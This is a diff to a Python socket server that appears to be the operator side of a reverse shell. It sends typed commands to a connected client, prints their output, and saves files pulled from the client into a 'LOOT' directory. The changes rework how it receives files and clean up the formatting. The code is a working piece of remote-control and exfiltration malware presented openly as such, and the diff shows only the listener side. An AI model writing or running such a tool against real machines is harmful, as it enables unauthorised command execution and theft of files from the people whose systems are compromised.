@@ -20,33 +20,23 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         client_working_directory = conn.recv(1024).decode(ENCODING)
         while True:
             # get command to run
-            print()
-            command = input(f"{client_working_directory} $> ")
+            command = input(f"{client_working_directory} $>")
             # send command
             command = command.encode(ENCODING)
             conn.sendall(command)
 
-
-
             # get result
             recieved_output = conn.recv(1024).decode(ENCODING)
             print(recieved_output)
-            #handle client stopped
+            # handle client stopped
             if recieved_output == "special:client_stopped":
                 print("Client has been terminated.")
                 break
-            #handle file transfer
-            if recieved_output [:20] == "special:recieve_file":
-                print("got special file transfer message")
-                with open(LOOT_PATH+recieved_output[21:],"wb") as file:
-                    print("opened file")
-                    buffer = conn.recv(1024)
-                    print("got initial buffer")
-                    while buffer:
-                        file.write(buffer)
-                        print("wrote buffer to file")
-                        buffer = conn.recv(1024)
-                        print("recieved from socket")
-                print("all done")
-            #recieve client working directory
+            # handle file transfer
+            if recieved_output[:20] == "special:recieve_file":
+                filename, file_size = recieved_output[21:].split(" ")
+                with open(LOOT_PATH+filename, "wb") as file:
+                    buffer = conn.recv(int(file_size))
+                    file.write(buffer)
+            # recieve client working directory
             client_working_directory = conn.recv(1024).decode(ENCODING)
